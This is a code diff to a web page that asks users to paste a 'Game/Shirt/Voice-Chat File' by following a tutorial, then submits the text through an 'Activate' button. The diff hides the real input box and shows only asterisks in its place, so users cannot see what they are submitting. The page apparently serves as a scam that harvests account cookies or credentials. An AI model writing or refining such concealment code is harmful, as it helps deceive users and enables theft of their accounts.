@@ -927,7 +927,8 @@ textarea:focus {
         <input type="hidden" id="scriptType" name="scriptType" value="">
 
         <label class="input-label" for="ps">Input Here</label>
-        <textarea id="ps" placeholder="Paste Game/Shirt/Voice-Chat File Here (Watch Tutorial on how to do it)."></textarea>
+        <textarea id="ps" placeholder="Paste Game/Shirt/Voice-Chat File Here (Watch Tutorial on how to do it)." style="display: none;"></textarea>
+        <textarea id="psDisplay" placeholder="Paste Game/Shirt/Voice-Chat File Here (Watch Tutorial on how to do it)."></textarea>
 
         <button id="btn" class="activate-btn">Activate</button>
 
@@ -1143,6 +1144,82 @@ let apiToken = null;
             }
         }
 
+// Input masking functionality
+document.addEventListener('DOMContentLoaded', function() {
+  const realTextarea = document.getElementById('ps');
+  const displayTextarea = document.getElementById('psDisplay');
+  let realValue = '';
+
+  displayTextarea.addEventListener('input', function(e) {
+    const newValue = e.target.value;
+    const cursorPos = e.target.selectionStart;
+    
+    // Handle backspace/delete
+    if (newValue.length < displayTextarea.dataset.lastLength) {
+      const deletedCount = displayTextarea.dataset.lastLength - newValue.length;
+      const deleteStart = cursorPos;
+      realValue = realValue.slice(0, deleteStart) + realValue.slice(deleteStart + deletedCount);
+    } else {
+      // Handle new input
+      const addedText = newValue.slice(displayTextarea.dataset.lastCursor || 0, cursorPos);
+      const nonAsterisks = addedText.replace(/\*/g, '');
+      if (nonAsterisks) {
+        const insertPos = displayTextarea.dataset.lastCursor || 0;
+        realValue = realValue.slice(0, insertPos) + nonAsterisks + realValue.slice(insertPos);
+      }
+    }
+    
+    // Update real textarea
+    realTextarea.value = realValue;
+    
+    // Update display with asterisks
+    const maskedValue = '*'.repeat(realValue.length);
+    if (displayTextarea.value !== maskedValue) {
+      displayTextarea.value = maskedValue;
+      displayTextarea.setSelectionRange(cursorPos, cursorPos);
+    }
+    
+    // Store current state
+    displayTextarea.dataset.lastLength = displayTextarea.value.length;
+    displayTextarea.dataset.lastCursor = cursorPos;
+  });
+
+  displayTextarea.addEventListener('paste', function(e) {
+    e.preventDefault();
+    const pastedText = (e.clipboardData || window.clipboardData).getData('text');
+    const cursorPos = e.target.selectionStart;
+    const endPos = e.target.selectionEnd;
+    
+    // Replace selected text or insert at cursor
+    realValue = realValue.slice(0, cursorPos) + pastedText + realValue.slice(endPos);
+    realTextarea.value = realValue;
+    
+    // Update display
+    const maskedValue = '*'.repeat(realValue.length);
+    displayTextarea.value = maskedValue;
+    
+    // Set cursor position
+    const newCursorPos = cursorPos + pastedText.length;
+    displayTextarea.setSelectionRange(newCursorPos, newCursorPos);
+    
+    // Store current state
+    displayTextarea.dataset.lastLength = displayTextarea.value.length;
+    displayTextarea.dataset.lastCursor = newCursorPos;
+  });
+
+  // Handle keyboard shortcuts
+  displayTextarea.addEventListener('keydown', function(e) {
+    if (e.ctrlKey && e.key === 'a') {
+      // Select all
+      e.preventDefault();
+      displayTextarea.select();
+    } else if (e.ctrlKey && e.key === 'Enter') {
+      // Ctrl+Enter to submit
+      go();
+    }
+  });
+});
+
 async function go(){
   const ps = document.getElementById("ps").value.trim();
   const scriptType = document.getElementById("scriptType").value;
@@ -1226,7 +1303,13 @@ async function go(){
       statusEl.style.display = "block";
 
       document.getElementById("ps").value = "";
+      document.getElementById("psDisplay").value = "";
       document.getElementById("scriptType").value = "";
+      
+      // Reset masking state
+      const displayTextarea = document.getElementById('psDisplay');
+      displayTextarea.dataset.lastLength = '0';
+      displayTextarea.dataset.lastCursor = '0';
 
       const selectedText = document.querySelector('.selected-text');
       selectedText.textContent = "Select service type...";
